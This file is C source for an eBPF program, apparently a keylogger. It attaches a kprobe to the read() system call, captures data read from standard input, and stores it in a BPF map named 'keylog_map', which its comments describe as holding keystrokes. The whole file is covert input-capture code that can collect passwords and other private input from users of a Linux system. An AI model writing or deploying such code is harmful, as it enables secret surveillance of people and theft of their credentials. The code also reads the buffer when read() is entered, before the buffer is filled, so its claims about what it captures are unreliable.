#include <linux/bpf.h>
#include <linux/ptrace.h>
#include <linux/unistd.h>

// macros for defining a map t store keylogs 
struct bpf_map_def SEC("maps") keylog_map = {
    .type = BPF_MAP_TYPE_HASH,
    .key_size = sizeof(int),
    .value_size = sizeof(char[1024]),// this is a limitation only accapts only till 1024 
    .max_entries = 1,
};

// Hook the kprobe into read() system call
SEC("kprobe/read")
int bpf_read(struct pt_regs *ctx) {
    int fd = (int)PT_REGS_PARM1(ctx);       // File descriptor (e.g., 0 for stdin)
    void *buf = (void *)PT_REGS_PARM2(ctx); // Buffer where data is read
    size_t count = (size_t)PT_REGS_PARM3(ctx); // Number of bytes read

    // Only process if it's stdin (fd == 0) fd =0 is deafult for standard input 
    if (fd == 0) {
        char keylog[1024] = {0};
        size_t len = count;

        // Truncate if the input is longer than the buffer
    if (len > sizeof(keylog) - 1) {
            len = sizeof(keylog) - 1;
        }

        // copying the contents of the buffer 
        bpf_probe_read_user_str(keylog, len, buf);

        // updating the map with the data (the keystrokes )
        bpf_map_update_elem(&keylog_map, &fd, keylog, BPF_ANY);
    }

    return 0;
}

